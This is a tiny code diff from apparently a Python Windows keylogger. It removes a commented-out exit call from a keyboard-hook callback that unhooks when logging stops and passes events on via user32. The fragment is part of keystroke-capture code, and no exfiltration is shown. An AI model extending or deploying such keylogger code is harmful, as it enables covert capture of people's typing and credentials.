@@ -149,7 +149,6 @@ class Key(threading.Thread):
         global loggingState
         if not loggingState:
             self.keyLogger.uninstallHookProc()
-            #sys.exit(-1)
         return self.user32.CallNextHookEx(self.keyLogger.hooked, nCode, wParam, lParam)
 
     def startKeyLog(self): #(8)
